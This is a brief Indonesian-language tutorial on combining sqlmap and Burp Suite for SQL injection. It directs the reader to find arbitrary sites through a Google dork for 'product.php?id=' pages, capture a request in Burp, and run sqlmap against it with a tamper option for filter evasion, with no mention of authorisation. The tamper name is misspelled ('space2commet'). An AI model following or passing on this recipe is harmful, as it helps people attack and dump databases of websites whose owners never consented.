# cara memakai sqlmap + burp suite

1.masukan gdorking contoh site:.com inurl:"product.php?id="

2.salin hasil intercept on

3.buat file contoh filename.txt

4.jalakan sqlmap (sqlmap -r filename.txt) bisa custom --tamper=space2commet --level 1 --risk 1
